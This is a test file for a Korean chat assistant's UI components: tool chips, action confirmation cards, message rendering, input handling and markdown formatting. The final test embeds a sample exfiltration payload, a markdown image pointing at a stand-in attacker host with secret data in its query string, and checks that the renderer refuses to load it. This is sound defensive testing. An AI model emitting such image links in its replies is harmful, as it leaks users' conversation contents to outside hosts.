import { describe, expect, it, vi } from "vitest";
import { fireEvent, render, screen } from "@testing-library/react";
import ToolChip from "@/components/chat/ToolChip";
import ConfirmCard from "@/components/chat/ConfirmCard";
import MessageView from "@/components/chat/MessageView";
import Composer from "@/components/chat/Composer";

describe("채팅 UI", () => {
  it("도구 칩 — 접힌 한 줄, 누르면 요약", () => {
    render(<ToolChip tool={{ id: "t1", tool: "list_mail_inbox", location: "desktop-relay", status: "ok", summary: "받은메일 목록 3건: a" }} />);
    const chip = screen.getByRole("button", { name: /받은메일 목록 · 아마란스\(데스크톱 앱\)/ });
    expect(screen.queryByText("받은메일 목록 3건: a")).toBeNull();
    fireEvent.click(chip);
    expect(screen.getByText("받은메일 목록 3건: a")).toBeTruthy();
  });
  it("확인 카드 — 대상·내용을 보여 주고 실행/취소", () => {
    const onAnswer = vi.fn();
    render(<ConfirmCard calls={[{ id: "t1", tool: "teams_send", input: { chat_id: "19:x", chat_name: "모델이 쓴 이름", text: "안녕하세요" }, location: "server", tier: "write", target: "개발1팀" }]} onAnswer={onAnswer} />);
    expect(screen.getByText("대상")).toBeTruthy();
    expect(screen.getByText("개발1팀")).toBeTruthy();
    expect(screen.queryByText("모델이 쓴 이름")).toBeNull();
    expect(screen.getByText("안녕하세요")).toBeTruthy();
    expect(screen.queryByText("19:x")).toBeNull();
    fireEvent.click(screen.getByRole("button", { name: "실행" }));
    expect(onAnswer).toHaveBeenCalledWith(true);
  });
  it("메시지 — 가린 건수 배지, 실패면 다시 시도", () => {
    const onRetry = vi.fn();
    render(<MessageView message={{ id: "m1", role: "assistant", text: "**굵게**", attachments: [], tools: [], status: "failed", masked: 2 }} onRetry={onRetry} />);
    expect(screen.getByText("개인정보 2건 가림")).toBeTruthy();
    expect(screen.getByText("굵게").tagName).toBe("STRONG");
    fireEvent.click(screen.getByRole("button", { name: "다시 시도" }));
    expect(onRetry).toHaveBeenCalled();
  });
  it("입력 — Enter 전송, Shift+Enter·한글 조합 중에는 전송 안 함", () => {
    const onSend = vi.fn();
    render(<Composer busy={false} models={["claude-sonnet-5-5", "claude-opus-5-5"]} model="claude-sonnet-5-5" onModel={() => {}} onSend={onSend} />);
    const box = screen.getByRole("textbox", { name: "메시지" });
    fireEvent.change(box, { target: { value: "안녕" } });
    fireEvent.keyDown(box, { key: "Enter", shiftKey: true });
    fireEvent.keyDown(box, { key: "Enter", isComposing: true });
    expect(onSend).not.toHaveBeenCalled();
    fireEvent.keyDown(box, { key: "Enter" });
    expect(onSend).toHaveBeenCalledWith("안녕", []);
  });
});

describe("마크다운 서식", () => {
  it("표·목록·굵게를 HTML로 그리고 표는 가로 스크롤 상자에 담는다", () => {
    const text = "**장기근속**\n\n- 3년 주기\n\n| 근속 | 휴가 |\n|---|---|\n| 3년 | 3일 |";
    const { container } = render(<MessageView message={{ id: "m1", role: "assistant", text, attachments: [], tools: [], status: "ok", masked: 0 }} />);
    expect(container.querySelector("table")).toBeTruthy();
    expect(container.querySelectorAll("tbody tr")).toHaveLength(1);
    expect(container.querySelector("th")?.textContent).toBe("근속");
    expect(container.querySelector("table")?.parentElement?.className).toContain("overflow-x-auto");
    expect(container.querySelector("li")?.textContent).toBe("3년 주기");
    expect(container.textContent).not.toContain("|---|");
  });
  it("마크다운 이미지는 불러오지 않는다(외부 주소로 대화 내용이 새는 경로) — 대체 글만", () => {
    const { container } = render(<MessageView message={{ id: "m1", role: "assistant", text: "요약 ![로고](https://evil.test/p?d=secret) 끝", attachments: [], tools: [], status: "ok", masked: 0 }} />);
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("evil.test");
    expect(container.textContent).toContain("[이미지: 로고]");
  });
});
